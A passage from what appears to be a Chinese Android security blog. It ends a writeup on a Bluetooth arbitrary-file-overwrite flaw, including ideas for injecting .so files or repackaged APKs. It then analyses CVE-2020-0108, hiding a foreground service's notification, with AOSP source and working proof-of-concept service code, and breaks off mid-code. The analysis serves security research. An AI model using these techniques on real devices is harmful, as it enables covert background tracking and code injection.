class="type">String</span> <span class="variable">str4</span> <span class="operator">=</span> str3 + <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">                        ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;str: &quot;</span> + str4);</span><br><span class="line">                        <span class="built_in">this</span>.mBluetoothBypassModule.sendDataFromSendModule(str4, <span class="literal">false</span>);</span><br><span class="line">                        maxLength = <span class="number">0</span>;</span><br><span class="line">                        Arrays.fill(newBuffer, (<span class="type">byte</span>) <span class="number">0</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            BluetoothService.mHandler.sendEmptyMessageDelayed(<span class="number">1000</span>, <span class="number">3000L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.mHandler.sendEmptyMessage(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">this</span>.isFileMode = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.fos != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.fos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line">            e1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>文件路径是由蓝牙套接字流输入指定的，没有对路径进行检查，所以攻击者可以利用这一点来覆盖在<code>FactoryAirCommandManager</code>上下文中的任意文件。而且，这个程序拥有强制接受任何蓝牙配对请求的权限，因为<code>BluetoothService</code>的代码会自动检索并设置配对<code>PIN</code>码。这就使得攻击者可以悄悄地触发这个漏洞，而不需要欺骗用户手动确认蓝牙配对。</p>
<h1 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4. 漏洞利用"></a>4. 漏洞利用</h1><p>可以注入的代码有两种类型：</p>
<ol>
<li><code>/data/app/A/lib</code>中的<code>so</code>文件；</li>
<li><code>/data/app/A/</code>中的<code>base.apk</code>。</li>
</ol>
<p>对于第一种类型，可以直接注入<code>so</code>，因为应用程序安装后，<code>PackageManagerService</code>就不会再对<code>so</code>进行检查了，直至应用程序卸载或完全更新。</p>
<p>对于第二种类型，思路是使用重打包的包来替换<code>base.apk</code>，这种方式较为灵活，可以绕过应用程序对动态库的校验，以及，对于没有库的应用程序也可以正常使用。这种方式的缺点是，<code>PackageManagerService</code>会在每一次重启后，重新校验应用程序，这个过程会导致失败，也就意味着，这种方式只能存活一次。</p>
<p>对于第一种类型，京东的思路是注入共享库，然后，应用程序启动并加载共享库，共享库再启动 <code>frida-gadget</code>，最后运行攻击脚本。同时，京东还使用了LIFE对应用程序原始的共享库进行注入，使用LIFE时需要注意的一点是，要在注入的文件中使用一个足够长的路径，因为Android会在安装路径中添加随机后缀。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-06-25T02:44:25.000Z" title="2022/6/25 10:44:25">2022-06-25</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-06-25T11:45:58.498Z" title="2022/6/25 19:45:58">2022-06-25</time></span><span class="level-item">11 minutes read (About 1607 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/06/25/Android-Foreground-%E9%A9%BB%E7%95%99%E6%BC%8F%E6%B4%9E-CVE-2020-0108/">Android Foreground 驻留漏洞(CVE-2020-0108)</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前台服务的处理代码中存在着逻辑漏洞，成功利用该漏洞的攻击者可以绕过前台服务的通知显示并持续在后台运行，可以在后台进行一些定位、录音等操作。</p>
<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>Android 8.1、9、10。</p>
<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><ul>
<li>前台服务是Google在Android 8.0中引入的概念，由于Android 8.0不允许后台启动后台服务，所以设计了前台服务，前台服务优先级较高，可以长时间在后台运行，但是前台服务在启动后5秒必须绑定一个通知，否则会被杀死。</li>
<li>实际上，前台服务依旧是在“后台”运行的，只是由于绑定了一个用户可见的通知，所以Google称之为“前台服务”。</li>
</ul>
<h2 id="漏洞1"><a href="#漏洞1" class="headerlink" title="漏洞1"></a>漏洞1</h2><p><code>NotificationManagerService.java</code>的<a target="_blank" rel="noopener" href="https://cs.android.com/android/platform/superproject/+/android-10.0.0_r29:frameworks/base/services/core/java/com/android/server/notification/NotificationManagerService.java;bpv=1;bpt=1;l=903?gsn=onNotificationError&gs=kythe://android.googlesource.com/platform/superproject?lang=java?path=%253Canonymous%2520com.android.server.notification.NotificationManagerService%25241%253E%23dadec13a7bb2927b4b551d172e3fa71b36e2b7496f6577cba42918727fdf287e"><code>onNotificationError()</code></a>方法，未能正确处理通知显示时的异常。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onNotificationError</span><span class="params">(<span class="type">int</span> callingUid, <span class="type">int</span> callingPid, String pkg, String tag, <span class="type">int</span> id,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> uid, <span class="type">int</span> initialPid, String message, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line">    cancelNotification(callingUid, callingPid, pkg, tag, id, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">false</span>, userId,</span><br><span class="line">            REASON_ERROR, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前台服务启动后，即使未能正确地显示通知，也不会导致前台服务终止。比如前台服务在创建通知时使用了自定义的布局，在创建<code>RemoteViews</code>对象时传入了一个不存在的<code>layout ID</code>，造成<code>NotificationManagerService</code>对通知的布局解析失败而抛出异常，此时会调用到<code>onNitificationError</code>方法。由于<code>onNotificationError</code>方法中只是调用了<code>cancelNotification</code>方法来取消通知，而没有去终止服务或终止整个应用程序，这时候前台服务就会在不显示通知的情况下继续运行。</p>
<p>实际测试好像还是需要捕获异常才行，否则应用直接崩溃，但是没看见在哪抛出异常啊。</p>
<h2 id="漏洞2"><a href="#漏洞2" class="headerlink" title="漏洞2"></a>漏洞2</h2><p><code>ServiceRecord</code>中<code>postNotification</code>方法中，没有正确处理通知显示中的异常情况，而是将异常抛出给了用户程序。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postNotification</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">appUid</span> <span class="operator">=</span> appInfo.uid;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">appPid</span> <span class="operator">=</span> app.pid;</span><br><span class="line">    <span class="keyword">if</span> (foregroundId != <span class="number">0</span> &amp;&amp; foregroundNoti != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// Do asynchronous communication with notification manager to</span></span><br><span class="line">        <span class="comment">// avoid deadlocks.</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">localPackageName</span> <span class="operator">=</span> packageName;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">localForegroundId</span> <span class="operator">=</span> foregroundId;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Notification</span> <span class="variable">_foregroundNoti</span> <span class="operator">=</span> foregroundNoti;</span><br><span class="line">        ams.mHandler.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">NotificationManagerInternal</span> <span class="variable">nm</span> <span class="operator">=</span> LocalServices.getService(</span><br><span class="line">                        NotificationManagerInternal.class);</span><br><span class="line">                <span class="keyword">if</span> (nm == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">Notification</span> <span class="variable">localForegroundNoti</span> <span class="operator">=</span> _foregroundNoti;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (localForegroundNoti.getSmallIcon() == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// It is not correct for the caller to not supply a notification</span></span><br><span class="line">                        <span class="comment">// icon, but this used to be able to slip through, so for</span></span><br><span class="line">                        <span class="comment">// those dirty apps we will create a notification clearly</span></span><br><span class="line">                        <span class="comment">// blaming the app.</span></span><br><span class="line">                        Slog.v(TAG, <span class="string">&quot;Attempted to start a foreground service (&quot;</span></span><br><span class="line">                                + shortInstanceName</span><br><span class="line">                                + <span class="string">&quot;) with a broken notification (no icon: &quot;</span></span><br><span class="line">                                + localForegroundNoti</span><br><span class="line">                                + <span class="string">&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="type">CharSequence</span> <span class="variable">appName</span> <span class="operator">=</span> appInfo.loadLabel(</span><br><span class="line">                                ams.mContext.getPackageManager());</span><br><span class="line">                        <span class="keyword">if</span> (appName == <span class="literal">null</span>) &#123;</span><br><span class="line">                            appName = appInfo.packageName;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ctx = ams.mContext.createPackageContextAsUser(</span><br><span class="line">                                    appInfo.packageName, <span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">UserHandle</span>(userId));</span><br><span class="line"></span><br><span class="line">                            Notification.<span class="type">Builder</span> <span class="variable">notiBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Notification</span>.Builder(ctx,</span><br><span class="line">                                    localForegroundNoti.getChannelId());  &lt;------- <span class="number">1</span></span><br><span class="line"></span><br><span class="line">                            <span class="comment">// it&#x27;s ugly, but it clearly identifies the app</span></span><br><span class="line">                            notiBuilder.setSmallIcon(appInfo.icon);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">// mark as foreground</span></span><br><span class="line">                            notiBuilder.setFlag(Notification.FLAG_FOREGROUND_SERVICE, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="type">Intent</span> <span class="variable">runningIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(</span><br><span class="line">                                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS);</span><br><span class="line">                            runningIntent.setData(Uri.fromParts(<span class="string">&quot;package&quot;</span>,</span><br><span class="line">                                    appInfo.packageName, <span class="literal">null</span>));</span><br><span class="line">                            <span class="type">PendingIntent</span> <span class="variable">pi</span> <span class="operator">=</span> PendingIntent.getActivityAsUser(ams.mContext, <span class="number">0</span>,</span><br><span class="line">                                    runningIntent, PendingIntent.FLAG_UPDATE_CURRENT, <span class="literal">null</span>,</span><br><span class="line">                                    UserHandle.of(userId));</span><br><span class="line">                            notiBuilder.setColor(ams.mContext.getColor(</span><br><span class="line">                                    com.android.internal</span><br><span class="line">                                            .R.color.system_notification_accent_color));</span><br><span class="line">                            notiBuilder.setContentTitle(</span><br><span class="line">                                    ams.mContext.getString(</span><br><span class="line">                                            com.android.internal.R.string</span><br><span class="line">                                                    .app_running_notification_title,</span><br><span class="line">                                            appName));</span><br><span class="line">                            notiBuilder.setContentText(</span><br><span class="line">                                    ams.mContext.getString(</span><br><span class="line">                                            com.android.internal.R.string</span><br><span class="line">                                                    .app_running_notification_text,</span><br><span class="line">                                            appName));</span><br><span class="line">                            notiBuilder.setContentIntent(pi);</span><br><span class="line"></span><br><span class="line">                            localForegroundNoti = notiBuilder.build();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (nm.getNotificationChannel(localPackageName, appUid,</span><br><span class="line">                            localForegroundNoti.getChannelId()) == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">targetSdkVersion</span> <span class="operator">=</span> Build.VERSION_CODES.O_MR1;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">final</span> <span class="type">ApplicationInfo</span> <span class="variable">applicationInfo</span> <span class="operator">=</span></span><br><span class="line">                                    ams.mContext.getPackageManager().getApplicationInfoAsUser(</span><br><span class="line">                                            appInfo.packageName, <span class="number">0</span>, userId);</span><br><span class="line">                            targetSdkVersion = applicationInfo.targetSdkVersion;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (targetSdkVersion &gt;= Build.VERSION_CODES.O_MR1) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(</span><br><span class="line">                                    <span class="string">&quot;invalid channel for service notification: &quot;</span></span><br><span class="line">                                            + foregroundNoti);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (localForegroundNoti.getSmallIcon() == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// Notifications whose icon is 0 are defined to not show</span></span><br><span class="line">                        <span class="comment">// a notification, silently ignoring it.  We don&#x27;t want to</span></span><br><span class="line">                        <span class="comment">// just ignore it, we want to prevent the service from</span></span><br><span class="line">                        <span class="comment">// being foreground.</span></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;invalid service notification: &quot;</span></span><br><span class="line">                                + foregroundNoti);</span><br><span class="line">                    &#125;</span><br><span class="line">                    nm.enqueueNotification(localPackageName, localPackageName,</span><br><span class="line">                            appUid, appPid, <span class="literal">null</span>, localForegroundId, localForegroundNoti,</span><br><span class="line">                            userId);</span><br><span class="line"></span><br><span class="line">                    foregroundNoti = localForegroundNoti; <span class="comment">// save it for amending next time</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (RuntimeException e) &#123; &lt;------- <span class="number">2</span></span><br><span class="line">                    Slog.w(TAG, <span class="string">&quot;Error showing notification for service&quot;</span>, e);</span><br><span class="line">                    <span class="comment">// If it gave us a garbage notification, it doesn&#x27;t</span></span><br><span class="line">                    <span class="comment">// get to be foreground.</span></span><br><span class="line">                    ams.setServiceForeground(instanceName, ServiceRecord.<span class="built_in">this</span>,</span><br><span class="line">                            <span class="number">0</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">                    ams.crashApplication(appUid, appPid, localPackageName, -<span class="number">1</span>,</span><br><span class="line">                            <span class="string">&quot;Bad notification for startForeground: &quot;</span> + e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这种情况下，前台服务启动后，若用户程序捕获了主线程的异常，即使未能正确显示通知，也不会导致前台服务终止。比如说前台服务在创建通知时传入了不合法的<code>Channel ID</code>，这样在<code>ServiceRecord</code>的<code>postNotification</code>方法中发送通知时，就会抛出异常。在异常处理过程中，只是调用了AMS的<code>crashApplication</code>方法来向应用抛出一个主线程的异常，但是如果应用在主线程捕获了异常，则应用就不会崩溃，这时候前台服务就会在不显示通知的情况下继续运行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">crashApplication</span><span class="params">(<span class="type">int</span> uid, <span class="type">int</span> initialPid, String packageName, <span class="type">int</span> userId,</span></span><br><span class="line"><span class="params">        String message)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (checkCallingPermission(android.Manifest.permission.FORCE_STOP_PACKAGES)</span><br><span class="line">            != PackageManager.PERMISSION_GRANTED) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Permission Denial: crashApplication() from pid=&quot;</span></span><br><span class="line">                + Binder.getCallingPid()</span><br><span class="line">                + <span class="string">&quot;, uid=&quot;</span> + Binder.getCallingUid()</span><br><span class="line">                + <span class="string">&quot; requires &quot;</span> + android.Manifest.permission.FORCE_STOP_PACKAGES;</span><br><span class="line">        Slog.w(TAG, msg);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="built_in">this</span>) &#123;</span><br><span class="line">        mAppErrors.scheduleAppCrashLocked(uid, initialPid, packageName, userId, message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="漏洞1-1"><a href="#漏洞1-1" class="headerlink" title="漏洞1"></a>漏洞1</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FServiceA</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;FServiceA&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Return the communication channel to the service.</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(<span class="string">&quot;Not yet implemented&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> flags, <span class="type">int</span> startId)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Handler</span>(Looper.getMainLooper()).post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Looper.loop();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      </span><br><span class="line">        <span class="type">NotificationManager</span> <span class="variable">notificationManager</span> <span class="operator">=</span> (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);</span><br><span class="line">        <span class="type">NotificationChannel</span> <span class="variable">notificationChannel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationChannel</span>(<span class="string">&quot;c01&quot;</span>, <span class="string">&quot;CVE-2020-0108&quot;</span>, NotificationManager.IMPORTANCE_DEFAULT);</span><br><span class="line">        notificationChannel.setDescription(<span class="string">&quot;Testing CVE-2020-0108&quot;</span>);</span><br><span class="line">        notificationChannel.enableLights(<span class="literal">true</span>);</span><br><span class="line">        notificationChannel.setLightColor(Color.RED);</span><br><span class="line">        notificationChannel.enableVibration(<span class="literal">true</span>);</span><br><span class="line">        notificationChannel.setVibrationPattern(<span class="keyword">new</span> <span class="title class_">long</span>[]&#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="number">500</span>, <span class="number">400</span>, <span class="number">300</span>, <span class="number">200</span>, <span class="number">100</span>&#125;);</span><br><span class="line">        notificationManager.createNotificationChannel(notificationChannel);</span><br><span class="line">      </span><br><span class="line"><span class="comment">//        Create a RemoteViews object with a invalid layout ID</span></span><br><span class="line">        <span class="type">RemoteViews</span> <span class="variable">remoteViews</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteViews</span>(getPackageName(), -<span class="number">1</span> <span class="comment">/* A Invalid Layout ID */</span>);</span><br><span class="line">        <span class="type">Notification</span> <span class="variable">notification</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NotificationCompat</span>.Builder(<span class="built_in">this</span>, <span class="string">&quot;c01&quot;</span>)</span><br><span class="line">                .setContentTitle(<span class="string">&quot;Testing CVE-2020-0108&quot;</span>)</span><br><span class="line">                .setContentText(<span class="string">&quot;If you see this means you device is not vulnerable&quot;</span>)</span><br><span class="line">                .setCustomBigContentView(remoteViews)</span><br><span class="line">                .setWhen(System.currentTimeMillis())</span><br><span class="line">                .setSmallIcon(R.drawable.ic_launcher_foreground)</span><br><span class="line">                .setLargeIcon(BitmapFactory.decodeResource(getResources(), 	R.drawable.ic_launcher_foreground))</span><br><span class="line">                .build();</span><br><span class="line">        startForeground(<span class="number">1</span>, notification);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">MyRunnable</span>()).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">15</span>; i++) &#123;</span><br><span class="line">                Log.e(<span class="string">&quot;onNotificationError&quot;</span>,<span class="string">&quot;Run Count: &quot;</span> + i);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞2-1"><a href="#漏洞2-1" class="headerlink" title="漏洞2"></a>漏洞2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FServiceB</span> <span class="keyword">extends</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;FServiceB&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> IBinder <span class="title function_">onBind</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Return the communication channel to the service.</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> 